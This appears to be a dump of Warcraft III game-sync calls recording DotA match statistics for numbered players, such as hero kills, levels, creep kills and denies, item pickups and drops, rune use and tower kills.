	SendSyncDat("dr.x", "Data", "PUI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900739);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Level5", 10);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "Level7", 8);
	SendSyncDat("dr.x", "Data", "CSK1", 10);
	SendSyncDat("dr.x", "Data", "CSD1", 4);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 15);
	SendSyncDat("dr.x", "Data", "CSD7", 2);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 23);
	SendSyncDat("dr.x", "Data", "CSD2", 4);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 20);
	SendSyncDat("dr.x", "Data", "CSD8", 1);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 22);
	SendSyncDat("dr.x", "Data", "CSD3", 4);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 13);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 0);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 20);
	SendSyncDat("dr.x", "Data", "CSK10", 0);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 16);
	SendSyncDat("dr.x", "Data", "CSD5", 4);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 14);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "Level5", 3);
	SendSyncDat("dr.x", "Data", "Level7", 2);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227902537);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227895863);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227902512);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "Level5", 11);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227900746);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896132);
	SendSyncDat("dr.x", "Data", "Hero8", 5);
	SendSyncDat("dr.x", "Data", "Level7", 5);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "Level5", 9);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Level8", 5);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227902028);
	SendSyncDat("dr.x", "Data", "Level5", 4);
	SendSyncDat("dr.x", "Data", "Level6", 7);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "Level6", 3);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227903796);
	SendSyncDat("dr.x", "Data", "Hero2", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895375);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Level7", 7);
	SendSyncDat("dr.x", "Data", "Hero4", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 4);
	SendSyncDat("dr.x", "Data", "Assist11", 4);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "Hero9", 3);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist9", 3);
	SendSyncDat("dr.x", "Data", "Level8", 8);
	SendSyncDat("dr.x", "Data", "RuneUse2", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896131);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903557);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "RuneUse6", 8);
	SendSyncDat("dr.x", "Data", "PUI_8", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 0);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "Level8", 7);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901782);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901782);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227901782);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901785);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895894);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227900739);
	SendSyncDat("dr.x", "Data", "PUI_7", 0);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900994);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "Level6", 1);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895893);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227895893);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227903025);
	SendSyncDat("dr.x", "Data", "Level6", 10);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227903025);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227903028);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227903028);
	SendSyncDat("dr.x", "Data", "Level6", 4);
	SendSyncDat("dr.x", "Data", "Level6", 11);
	SendSyncDat("dr.x", "Data", "Hero9", 5);
	SendSyncDat("dr.x", "Data", "Level8", 2);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "Tower110", 2);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896134);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "Hero2", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 2);
	SendSyncDat("dr.x", "Data", "Hero10", 10);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895888);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227895888);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "Hero1", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "PUI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "DRI_10", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896134);
	SendSyncDat("dr.x", "Data", "Hero11", 4);
	SendSyncDat("dr.x", "Data", "Assist5", 11);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895376);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895376);
	SendSyncDat("dr.x", "Data", "Level7", 4);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "CSK1", 17);
	SendSyncDat("dr.x", "Data", "CSD1", 5);
	SendSyncDat("dr.x", "Data", "NK1", 0);
	SendSyncDat("dr.x", "Data", "CSK7", 22);
	SendSyncDat("dr.x", "Data", "CSD7", 2);
	SendSyncDat("dr.x", "Data", "NK7", 0);
	SendSyncDat("dr.x", "Data", "CSK2", 32);
	SendSyncDat("dr.x", "Data", "CSD2", 4);
	SendSyncDat("dr.x", "Data", "NK2", 0);
	SendSyncDat("dr.x", "Data", "CSK8", 32);
	SendSyncDat("dr.x", "Data", "CSD8", 1);
	SendSyncDat("dr.x", "Data", "NK8", 0);
	SendSyncDat("dr.x", "Data", "CSK3", 29);
	SendSyncDat("dr.x", "Data", "CSD3", 5);
	SendSyncDat("dr.x", "Data", "NK3", 0);
	SendSyncDat("dr.x", "Data", "CSK9", 15);
	SendSyncDat("dr.x", "Data", "CSD9", 2);
	SendSyncDat("dr.x", "Data", "NK9", 0);
	SendSyncDat("dr.x", "Data", "CSK4", 8);
	SendSyncDat("dr.x", "Data", "CSD4", 0);
	SendSyncDat("dr.x", "Data", "NK4", 23);
	SendSyncDat("dr.x", "Data", "CSK10", 3);
	SendSyncDat("dr.x", "Data", "CSD10", 0);
	SendSyncDat("dr.x", "Data", "NK10", 0);
	SendSyncDat("dr.x", "Data", "CSK5", 27);
	SendSyncDat("dr.x", "Data", "CSD5", 5);
	SendSyncDat("dr.x", "Data", "NK5", 0);
	SendSyncDat("dr.x", "Data", "CSK11", 23);
	SendSyncDat("dr.x", "Data", "CSD11", 3);
	SendSyncDat("dr.x", "Data", "NK11", 0);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "DRI_7", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227895861);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227900746);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899214);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901010);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227901010);
	SendSyncDat("dr.x", "Data", "Level7", 10);
	SendSyncDat("dr.x", "Data", "Hero3", 7);
	SendSyncDat("dr.x", "Data", "Assist8", 3);
	SendSyncDat("dr.x", "Data", "Assist10", 3);
	SendSyncDat("dr.x", "Data", "Hero1", 10);
	SendSyncDat("dr.x", "Data", "Assist7", 1);
	SendSyncDat("dr.x", "Data", "Assist8", 1);
	SendSyncDat("dr.x", "Data", "Assist9", 1);
	SendSyncDat("dr.x", "Data", "Level9", 7);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895376);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895378);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227895380);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_11", 1227896137);
	SendSyncDat("dr.x", "Data", "Level6", 9);
	SendSyncDat("dr.x", "Data", "DRI_11", 1227896137);
	SendSyncDat("dr.x", "Data", "RuneUse6", 2);
	SendSyncDat("dr.x", "Data", "PUI_2", 0);
	SendSyncDat("dr.x", "Data", "DRI_2", 0);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227903796);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "DRI_3", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227895898);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "RuneUse5", 5);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "PUI_5", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 0);
	SendSyncDat("dr.x", "Data", "Level7", 11);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "Tower111", 0);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227895898);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227901785);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896132);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896132);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227902265);
	SendSyncDat("dr.x", "Data", "PUI_7", 1227902265);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "Level9", 8);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "PUI_1", 1227896135);
	SendSyncDat("dr.x", "Data", "Level7", 3);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227896136);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227895879);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227900994);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_5", 1227902793);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895376);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227895859);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896153);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_1", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895376);
	SendSyncDat("dr.x", "Data", "DRI_2", 1227895375);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895378);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227895380);
	SendSyncDat("dr.x", "Data", "PUI_2", 1227896137);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "Level9", 2);
	SendSyncDat("dr.x", "Data", "Level8", 10);
	SendSyncDat("dr.x", "Data", "RuneUse1", 11);
	SendSyncDat("dr.x", "Data", "PUI_11", 0);
	SendSyncDat("dr.x", "Data", "DRI_11", 0);
	SendSyncDat("dr.x", "Data", "PUI_11", 0);
	SendSyncDat("dr.x", "Data", "DRI_11", 0);
	SendSyncDat("dr.x", "Data", "RuneUse6", 3);
	SendSyncDat("dr.x", "Data", "PUI_3", 0);
	SendSyncDat("dr.x", "Data", "DRI_3", 0);
	SendSyncDat("dr.x", "Data", "Level9", 5);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227895880);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227902793);
	SendSyncDat("dr.x", "Data", "Hero3", 8);
	SendSyncDat("dr.x", "Data", "Assist7", 3);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899213);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227902793);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227902791);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level10", 7);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_5", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "Tower112", 2);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_4", 1227903818);
	SendSyncDat("dr.x", "Data", "PUI_4", 1227896136);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level8", 4);
	SendSyncDat("dr.x", "Data", "Level7", 1);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_9", 1227896137);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "DRI_8", 1227899215);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "PUI_8", 1227899216);
	SendSyncDat("dr.x", "Data", "Level8", 11);
	SendSyncDat("dr.x", "Data", "Hero2", 9);
	SendSyncDat("dr.x", "Data", "Assist7", 2);
	SendSyncDat("dr.x", "Data", "Assist8", 2);
	SendSyncDat("dr.x", "Data", "Assist11", 2);
